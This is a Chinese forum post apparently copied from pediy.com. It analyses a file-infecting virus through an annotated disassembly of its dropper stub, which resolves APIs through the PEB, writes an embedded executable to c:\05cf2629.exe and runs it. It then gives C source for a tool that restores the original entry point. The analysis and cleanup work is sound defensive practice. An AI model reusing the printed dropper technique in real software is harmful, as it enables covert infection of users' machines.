@@ -1,0 +1,395 @@
+
+
+# 一个被感染程序的分析和清除工具的编写
+
+> 原文：[`www.pediy.com/kssd/pediy11/124605.html`](https://www.pediy.com/kssd/pediy11/124605.html)
+
+最近得到了个被感染的程序的样本,样本本身很简单,就是被添加了一个".UPX"节,伪装成加了壳的软件,修改了入口点,执行病毒代码.  
+00447000 >  55              push    ebp  
+00447001    8BEC            mov     ebp, esp  
+00447003    81EC 8C000000   sub     esp, 8C  
+00447009    64:A1 30000000  mov     eax, dword ptr fs:\[30\]  
+0044700F    8945 D8         mov     dword ptr \[ebp-28\], eax  
+00447012    C745 E8 00BA030>mov     dword ptr \[ebp-18\], 3BA00      ; 这里在取要释放病毒的文件明  
+00447019    C745 C4 433A5C3>mov     dword ptr \[ebp-3C\], 305C3A43  
+00447020    C745 C8 3563663>mov     dword ptr \[ebp-38\], 32666335  
+00447027    C745 CC 3632392>mov     dword ptr \[ebp-34\], 2E393236  
+0044702E    C745 D0 6578650>mov     dword ptr \[ebp-30\], 657865  
+00447035    8B45 D8         mov     eax, dword ptr \[ebp-28\]        ; 通过 PEB 得到 kernel 基地址  
+00447038    8B40 0C         mov     eax, dword ptr \[eax+C\]  
+0044703B    8B40 1C         mov     eax, dword ptr \[eax+1C\]  
+0044703E    8945 E4         mov     dword ptr \[ebp-1C\], eax  
+00447041    8B45 E4         mov     eax, dword ptr \[ebp-1C\]  
+00447044    8B00            mov     eax, dword ptr \[eax\]  
+00447046    8945 E4         mov     dword ptr \[ebp-1C\], eax  
+00447049    8B45 E4         mov     eax, dword ptr \[ebp-1C\]  
+0044704C    8B40 08         mov     eax, dword ptr \[eax+8\]  
+0044704F    8945 F4         mov     dword ptr \[ebp-C\], eax         ; 得到 kernel 基地址  
+00447052    8B45 F4         mov     eax, dword ptr \[ebp-C\]  
+00447055    8B40 3C         mov     eax, dword ptr \[eax+3C\]  
+00447058    8B4D F4         mov     ecx, dword ptr \[ebp-C\]  
+0044705B    8B55 F4         mov     edx, dword ptr \[ebp-C\]  
+0044705E    035401 78       add     edx, dword ptr \[ecx+eax+78\]    ; 获取导出表  
+00447062    8955 DC         mov     dword ptr \[ebp-24\], edx  
+00447065    8B45 DC         mov     eax, dword ptr \[ebp-24\]  
+00447068    8B4D F4         mov     ecx, dword ptr \[ebp-C\]  
+0044706B    0348 20         add     ecx, dword ptr \[eax+20\]  
+0044706E    894D B0         mov     dword ptr \[ebp-50\], ecx  
+00447071    8B45 DC         mov     eax, dword ptr \[ebp-24\]  
+00447074    8B4D F4         mov     ecx, dword ptr \[ebp-C\]  
+00447077    0348 24         add     ecx, dword ptr \[eax+24\]  
+0044707A    894D BC         mov     dword ptr \[ebp-44\], ecx  
+0044707D    8B45 DC         mov     eax, dword ptr \[ebp-24\]  
+00447080    8B4D F4         mov     ecx, dword ptr \[ebp-C\]  
+00447083    0348 1C         add     ecx, dword ptr \[eax+1C\]  
+00447086    894D B8         mov     dword ptr \[ebp-48\], ecx  
+00447089    C745 8C 4765745>mov     dword ptr \[ebp-74\], 50746547   ; 取 GetProcAddress 字符串  
+00447090    C745 90 726F634>mov     dword ptr \[ebp-70\], 41636F72  
+00447097    C745 94 6464726>mov     dword ptr \[ebp-6C\], 65726464  
+0044709E    C745 98 7373000>mov     dword ptr \[ebp-68\], 7373  
+004470A5    8365 88 00      and     dword ptr \[ebp-78\], 0  
+004470A9    EB 07           jmp     short 004470B2  
+004470AB    8B45 88         mov     eax, dword ptr \[ebp-78\]        ; 循环查找 GetProcAddress 函数地址  
+004470AE    40              inc     eax  
+004470AF    8945 88         mov     dword ptr \[ebp-78\], eax  
+004470B2    8B45 DC         mov     eax, dword ptr \[ebp-24\]  
+004470B5    8B4D 88         mov     ecx, dword ptr \[ebp-78\]  
+004470B8    3B48 18         cmp     ecx, dword ptr \[eax+18\]  
+004470BB    0F83 8A000000   jnb     0044714B  
+004470C1    C785 7CFFFFFF 0>mov     dword ptr \[ebp-84\], 1  
+004470CB    8365 80 00      and     dword ptr \[ebp-80\], 0  
+004470CF    8365 84 00      and     dword ptr \[ebp-7C\], 0  
+004470D3    8B45 88         mov     eax, dword ptr \[ebp-78\]  
+004470D6    8B4D B0         mov     ecx, dword ptr \[ebp-50\]  
+004470D9    8B55 F4         mov     edx, dword ptr \[ebp-C\]  
+004470DC    031481          add     edx, dword ptr \[ecx+eax\*4\]  
+004470DF    8955 80         mov     dword ptr \[ebp-80\], edx  
+004470E2    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+004470E5    8945 84         mov     dword ptr \[ebp-7C\], eax  
+004470E8    8B45 84         mov     eax, dword ptr \[ebp-7C\]  
+004470EB    0FBE00          movsx   eax, byte ptr \[eax\]  
+004470EE    85C0            test    eax, eax  
+004470F0    74 29           je      short 0044711B  
+004470F2    8B45 84         mov     eax, dword ptr \[ebp-7C\]  
+004470F5    0FBE00          movsx   eax, byte ptr \[eax\]  
+004470F8    8B4D 80         mov     ecx, dword ptr \[ebp-80\]  
+004470FB    0FBE09          movsx   ecx, byte ptr \[ecx\]  
+004470FE    3BC1            cmp     eax, ecx  
+00447100    74 09           je      short 0044710B  
+00447102    83A5 7CFFFFFF 0>and     dword ptr \[ebp-84\], 0  
+00447109    EB 10           jmp     short 0044711B  
+0044710B    8B45 84         mov     eax, dword ptr \[ebp-7C\]  
+0044710E    40              inc     eax  
+0044710F    8945 84         mov     dword ptr \[ebp-7C\], eax  
+00447112    8B45 80         mov     eax, dword ptr \[ebp-80\]  
+00447115    40              inc     eax  
+00447116    8945 80         mov     dword ptr \[ebp-80\], eax  
+00447119  ^ EB CD           jmp     short 004470E8  
+0044711B    83BD 7CFFFFFF 0>cmp     dword ptr \[ebp-84\], 1  
+00447122    75 22           jnz     short 00447146  
+00447124    8B45 80         mov     eax, dword ptr \[ebp-80\]  
+00447127    0FBE00          movsx   eax, byte ptr \[eax\]  
+0044712A    85C0            test    eax, eax  
+0044712C    75 18           jnz     short 00447146  
+0044712E    8B45 88         mov     eax, dword ptr \[ebp-78\]  
+00447131    8B4D BC         mov     ecx, dword ptr \[ebp-44\]  
+00447134    0FB70441        movzx   eax, word ptr \[ecx+eax\*2\]  
+00447138    8B4D B8         mov     ecx, dword ptr \[ebp-48\]  
+0044713B    8B55 F4         mov     edx, dword ptr \[ebp-C\]  
+0044713E    031481          add     edx, dword ptr \[ecx+eax\*4\]  
+00447141    8955 B4         mov     dword ptr \[ebp-4C\], edx  
+00447144    EB 05           jmp     short 0044714B  
+00447146  ^ E9 60FFFFFF     jmp     004470AB  
+0044714B    C745 8C 4765744>mov     dword ptr \[ebp-74\], 4D746547   ; 取 GetModuleHandleA 字符串  
+00447152    C745 90 6F64756>mov     dword ptr \[ebp-70\], 6C75646F  
+00447159    C745 94 6548616>mov     dword ptr \[ebp-6C\], 6E614865  
+00447160    C745 98 646C654>mov     dword ptr \[ebp-68\], 41656C64  
+00447167    8365 9C 00      and     dword ptr \[ebp-64\], 0  
+0044716B    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+0044716E    50              push    eax  
+0044716F    FF75 F4         push    dword ptr \[ebp-C\]  
+00447172    FF55 B4         call    dword ptr \[ebp-4C\]             ; 调用 GetProcAddress 得到 GetModuleHandleA 函数地址  
+00447175    8945 EC         mov     dword ptr \[ebp-14\], eax  
+00447178    C745 8C 4B65726>mov     dword ptr \[ebp-74\], 6E72654B   ; 取 Kernel32.dll 字符串  
+0044717F    C745 90 656C333>mov     dword ptr \[ebp-70\], 32336C65  
+00447186    C745 94 2E646C6>mov     dword ptr \[ebp-6C\], 6C6C642E  
+0044718D    8365 98 00      and     dword ptr \[ebp-68\], 0  
+00447191    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+00447194    50              push    eax  
+00447195    FF55 EC         call    dword ptr \[ebp-14\]             ; 调用 GetModuleHandleA 得到 Kernel32 模块地址  
+00447198    8945 F4         mov     dword ptr \[ebp-C\], eax  
+0044719B    C745 8C 4372656>mov     dword ptr \[ebp-74\], 61657243   ; 取 CreateFileA 字符串  
+004471A2    C745 90 7465466>mov     dword ptr \[ebp-70\], 69466574  
+004471A9    C745 94 6C65410>mov     dword ptr \[ebp-6C\], 0041656C  
+004471B0    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+004471B3    50              push    eax  
+004471B4    FF75 F4         push    dword ptr \[ebp-C\]  
+004471B7    FF55 B4         call    dword ptr \[ebp-4C\]             ; 得到 CreateFileA 函数地址  
+004471BA    8945 AC         mov     dword ptr \[ebp-54\], eax  
+004471BD    C745 8C 5772697>mov     dword ptr \[ebp-74\], 74697257   ; 取 WriteFile 字符串  
+004471C4    C745 90 6546696>mov     dword ptr \[ebp-70\], 6C694665  
+004471CB    C745 94 6500000>mov     dword ptr \[ebp-6C\], 65  
+004471D2    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+004471D5    50              push    eax  
+004471D6    FF75 F4         push    dword ptr \[ebp-C\]  
+004471D9    FF55 B4         call    dword ptr \[ebp-4C\]             ; 得到 WriteFile 函数地址  
+004471DC    8945 E0         mov     dword ptr \[ebp-20\], eax  
+004471DF    C745 8C 436C6F7>mov     dword ptr \[ebp-74\], 736F6C43   ; 取 CloseHandle 字符串  
+004471E6    C745 90 6548616>mov     dword ptr \[ebp-70\], 6E614865  
+004471ED    C745 94 646C650>mov     dword ptr \[ebp-6C\], 656C64  
+004471F4    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+004471F7    50              push    eax  
+004471F8    FF75 F4         push    dword ptr \[ebp-C\]  
+004471FB    FF55 B4         call    dword ptr \[ebp-4C\]             ; 得到 CloseHandle 函数地址  
+004471FE    8945 F0         mov     dword ptr \[ebp-10\], eax  
+00447201    C745 8C 57696E4>mov     dword ptr \[ebp-74\], 456E6957   ; 取 WinExec 字符串  
+00447208    C745 90 7865630>mov     dword ptr \[ebp-70\], 636578  
+0044720F    8D45 8C         lea     eax, dword ptr \[ebp-74\]  
+00447212    50              push    eax  
+00447213    FF75 F4         push    dword ptr \[ebp-C\]  
+00447216    FF55 B4         call    dword ptr \[ebp-4C\]             ; 得到 WinExec 函数地址  
+00447219    8945 FC         mov     dword ptr \[ebp-4\], eax  
+0044721C    6A 00           push    0  
+0044721E    68 80000000     push    80  
+00447223    6A 02           push    2  
+00447225    6A 00           push    0  
+00447227    6A 00           push    0  
+00447229    68 000000C0     push    C0000000  
+0044722E    8D45 C4         lea     eax, dword ptr \[ebp-3C\]  
+00447231    50              push    eax  
+00447232    FF55 AC         call    dword ptr \[ebp-54\]             ; 创建 c:\\05cf2629.exe  
+00447235    8945 C0         mov     dword ptr \[ebp-40\], eax  
+00447238    837D C0 FF      cmp     dword ptr \[ebp-40\], -1  
+0044723C    0F84 92000000   je      004472D4  
+00447242    E8 00000000     call    00447247  
+00447247    58              pop     eax  
+00447248    8985 78FFFFFF   mov     dword ptr \[ebp-88\], eax        ; 循环查找要释放的病毒体  
+0044724E    83A5 74FFFFFF 0>and     dword ptr \[ebp-8C\], 0  
+00447255    EB 0D           jmp     short 00447264  
+00447257    8B85 74FFFFFF   mov     eax, dword ptr \[ebp-8C\]  
+0044725D    40              inc     eax  
+0044725E    8985 74FFFFFF   mov     dword ptr \[ebp-8C\], eax  
+00447264    81BD 74FFFFFF F>cmp     dword ptr \[ebp-8C\], 1F4  
+0044726E    7D 64           jge     short 004472D4  
+00447270    8B85 78FFFFFF   mov     eax, dword ptr \[ebp-88\]  
+00447276    0FBE00          movsx   eax, byte ptr \[eax\]  
+00447279    83F8 4D         cmp     eax, 4D  
+0044727C    75 47           jnz     short 004472C5  
+0044727E    8B85 78FFFFFF   mov     eax, dword ptr \[ebp-88\]  
+00447284    0FB700          movzx   eax, word ptr \[eax\]  
+00447287    3D 4D5A0000     cmp     eax, 5A4D  
+0044728C    75 37           jnz     short 004472C5  
+0044728E    8B85 78FFFFFF   mov     eax, dword ptr \[ebp-88\]  
+00447294    0FB740 02       movzx   eax, word ptr \[eax+2\]  
+00447298    3D 90000000     cmp     eax, 90                        ; 找到 PE 头下一个字节为 90 标记的，说明找到了病毒体  
+0044729D    75 26           jnz     short 004472C5  
+0044729F    6A 00           push    0  
+004472A1    8D45 F8         lea     eax, dword ptr \[ebp-8\]  
+004472A4    50              push    eax  
+004472A5    FF75 E8         push    dword ptr \[ebp-18\]  
+004472A8    FFB5 78FFFFFF   push    dword ptr \[ebp-88\]  
+004472AE    FF75 C0         push    dword ptr \[ebp-40\]  
+004472B1    FF55 E0         call    dword ptr \[ebp-20\]             ; 写入数据  
+004472B4    FF75 C0         push    dword ptr \[ebp-40\]  
+004472B7    FF55 F0         call    dword ptr \[ebp-10\]  
+004472BA    6A 05           push    5  
+004472BC    8D45 C4         lea     eax, dword ptr \[ebp-3C\]  
+004472BF    50              push    eax  
+004472C0    FF55 FC         call    dword ptr \[ebp-4\]              ; 完成后执行释放的病毒  
+004472C3    EB 0F           jmp     short 004472D4  
+004472C5    8B85 78FFFFFF   mov     eax, dword ptr \[ebp-88\]  
+004472CB    40              inc     eax  
+004472CC    8985 78FFFFFF   mov     dword ptr \[ebp-88\], eax  
+004472D2  ^ EB 83           jmp     short 00447257  
+004472D4    C9              leave  
+004472D5    83C4 04         add     esp, 4  
+004472D8 >- E9 6A16FCFF     jmp     00408947                       ; 跳到原程序入口  
+  
+    至于释放的那个病毒行为，我还没具体分析，有兴趣的朋友可以自己去看看。  
+    我们现在来写修复工具吧，顺便复习下我的 SDK 编程。这个修复工具只是简单的找到原程序的入口点，并修改回原程序的入口点。  
+    由于自己只是针对该被感染的程序写的修复工具，所以没有考虑太多，接下来直接贴代码。  
+  
+#include "stdafx.h"  
+  
+HINSTANCE g\_hIn;  
+char szCharacter\[\]={0xC9,0x83,0xC4,0x04,0xE9};  
+  
+BOOL ClearVirus(char \*szFileName)  
+{  
+  char szOffset\[4\];  
+  DWORD \*dwTemp;  
+  char \*p;  
+  int i;  
+  PIMAGE\_DOS\_HEADER pDos=NULL;  
+  PIMAGE\_NT\_HEADERS pNT=NULL;  
+  PIMAGE\_SECTION\_HEADER pHead=NULL;  
+  PIMAGE\_OPTIONAL\_HEADER pOption=NULL;  
+  PIMAGE\_FILE\_HEADER pFile=NULL;  
+    HANDLE hFile=CreateFile(szFileName,GENERIC\_READ|GENERIC\_WRITE,FILE\_SHARE\_READ,NULL,OPEN\_EXISTING,  
+    FILE\_ATTRIBUTE\_NORMAL,NULL);  
+  if (hFile==NULL)  
+  {  
+    MessageBox(NULL,"打开文件失败","Note",MB\_OK);  
+    return FALSE;  
+  }  
+  HANDLE hMapFile=CreateFileMapping(hFile,NULL,PAGE\_READWRITE,0,0,NULL);  
+  if (hMapFile==NULL)  
+  {  
+    DWORD dwError=GetLastError();  
+    MessageBox(NULL,"创建文件映射失败","Note",MB\_OK);  
+    return FALSE;  
+  }  
+  LPVOID lpAdd=MapViewOfFile(hMapFile,FILE\_MAP\_ALL\_ACCESS,0,0,0);  
+  if (lpAdd==NULL)  
+  {  
+    MessageBox(NULL,"映射文件失败.","Note",MB\_OK);  
+    return FALSE;  
+  }  
+  pDos=(PIMAGE\_DOS\_HEADER)lpAdd;  
+  pNT=(PIMAGE\_NT\_HEADERS)(pDos->e\_lfanew+(DWORD)lpAdd);  
+  DWORD dwSection=pNT->FileHeader.NumberOfSections;  
+  pFile=&pNT->FileHeader;  
+  pOption=&pNT->OptionalHeader;  
+  pHead=(PIMAGE\_SECTION\_HEADER)((DWORD)pOption+pFile->SizeOfOptionalHeader);  
+  for (i=0;i<dwSection;i++)  
+  {  
+    if (strcmp((char\*)pHead->Name,".UPX")==0)  
+    {  
+      break;  
+    }  
+    pHead++;  
+  }  
+  DWORD dwSize=pHead->SizeOfRawData;  
+    char \*pCode=(char\*)(pHead->PointerToRawData+(DWORD)lpAdd);  
+  for (i=0;i<dwSize;i++)  
+  {  
+    if (pCode\[i\]==szCharacter\[0\]&&pCode\[i+1\]==szCharacter\[1\]&&pCode\[i+2\]==szCharacter\[2\]&&pCode\[i+3\]==szCharacter\[3\]&&pCode\[i+4\]==szCharacter\[4\])  
+    {  
+            p=&pCode\[i+5\];  
+            dwTemp=(DWORD\*)p; //得到偏移代码的地址  
+      DWORD dwOffsetCode=\*dwTemp;  //取内容，得到偏移代码  
+      p=&pCode\[i+9\];     
+      dwTemp=(DWORD\*)p;  //得到下条指令  
+      DWORD dwEntry=(DWORD)dwTemp+dwOffsetCode+0x3000-(DWORD)lpAdd;//得到原程序入口点  
+      pOption->AddressOfEntryPoint=dwEntry;  //还原入口点  
+      if (lpAdd!=NULL)  
+      {  
+        UnmapViewOfFile(lpAdd);  
+        lpAdd=NULL;  
+      }  
+      CloseHandle(hMapFile);  
+      CloseHandle(hFile);  
+       return TRUE;  
+    }  
+  }  
+  
+  if (lpAdd)  
+  {  
+    lpAdd=NULL;  
+    UnmapViewOfFile(lpAdd);  
+  }  
+  CloseHandle(hMapFile);  
+  CloseHandle(hFile);  
+  return FALSE;  
+}  
+  
+LRESULT CALLBACK WindowProc(  
+              HWND hwnd,      // handle to window  
+              UINT uMsg,      // message identifier  
+              WPARAM wParam,  // first message parameter  
+              LPARAM lParam   // second message parameter  
+              )  
+{  
+  switch(uMsg)  
+  {  
+  case WM\_CREATE:  
+    {  
+      CreateWindowEx(0,"button","Clear",WS\_CHILD|WS\_VISIBLE|BS\_PUSHBUTTON,150,100,80,30,  
+        hwnd,(HMENU)IDC\_BUTTON,g\_hIn,NULL);  
+    }  
+    break;  
+  case WM\_COMMAND:  
+    {  
+      switch(LOWORD(wParam))  
+      {  
+      case IDC\_BUTTON:  
+        {  
+          OPENFILENAME   ofn;   
+          char   szFile\[260\];  
+          ZeroMemory(&ofn, sizeof(ofn));     
+          ofn.lStructSize =sizeof(ofn);     
+          ofn.hwndOwner   =hwnd;     
+          ofn.lpstrFile   =szFile;    
+          ofn.lpstrFile\[0\]   ='\\0';     
+          ofn.nMaxFile   =sizeof(szFile);     
+          ofn.lpstrFilter   =   "All\\0\*.\*\\0Text\\0\*.TXT\\0";     
+          ofn.nFilterIndex   =   1;     
+          ofn.lpstrFileTitle   =   NULL;     
+          ofn.nMaxFileTitle   =   0;     
+          ofn.lpstrInitialDir   =   NULL;     
+          ofn.Flags   =   OFN\_PATHMUSTEXIST   |   OFN\_FILEMUSTEXIST;     
+          GetOpenFileName(&ofn);  
+                    if (ClearVirus(szFile))  
+                    {  
+            MessageBox(hwnd,"文件修复成功.","Note",MB\_OK);  
+                    }  
+          else  
+                        MessageBox(hwnd,"文件修复失败.","Note",MB\_OK);  
+                }  
+        break;  
+      }  
+    }  
+    break;  
+  case WM\_CLOSE:  
+    PostQuitMessage(WM\_CLOSE);  
+    break;  
+  }  
+  return DefWindowProc(hwnd,uMsg,wParam,lParam);  
+}  
+  
+int APIENTRY WinMain(HINSTANCE hInstance,  
+                     HINSTANCE hPrevInstance,  
+                     LPSTR     lpCmdLine,  
+                     int       nCmdShow)  
+{  
+   // TODO: Place code here.  
+  g\_hIn=hInstance;  
+  char szClassName\[\]="Clear";  
+    WNDCLASSEX wd;  
+  wd.cbSize=sizeof(wd);  
+  wd.cbClsExtra=0;  
+  wd.cbWndExtra=0;  
+  wd.hbrBackground=(HBRUSH)GetStockObject(GRAY\_BRUSH);  
+  wd.hCursor=NULL;  
+  wd.hIcon=NULL;  
+  wd.hIconSm=NULL;  
+  wd.hInstance=hInstance;  
+  wd.lpfnWndProc=WindowProc;  
+  wd.lpszClassName=szClassName;  
+  wd.lpszMenuName=NULL;  
+  wd.style=CS\_HREDRAW|CS\_VREDRAW;  
+  
+  RegisterClassEx(&wd);  
+  HWND hwnd=CreateWindowEx(0,szClassName,"Clear Virus",WS\_OVERLAPPEDWINDOW,CW\_USEDEFAULT,CW\_USEDEFAULT,  
+    400,300,NULL,NULL,hInstance,NULL);  
+  if (hwnd==NULL)  
+  {  
+    MessageBox(NULL,"CreateWindow fail.","Note",MB\_OK);  
+    return 0;  
+  }  
+  
+  ShowWindow(hwnd,nCmdShow);  
+  UpdateWindow(hwnd);  
+  
+  MSG msg;  
+  while(GetMessage(&msg,NULL,0,0))  
+  {  
+    TranslateMessage(&msg);  
+    DispatchMessage(&msg);  
+  }  
+  return msg.wParam;  
+}
+
+上传的附件
+| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || 密码 123456789.rar  
+ |
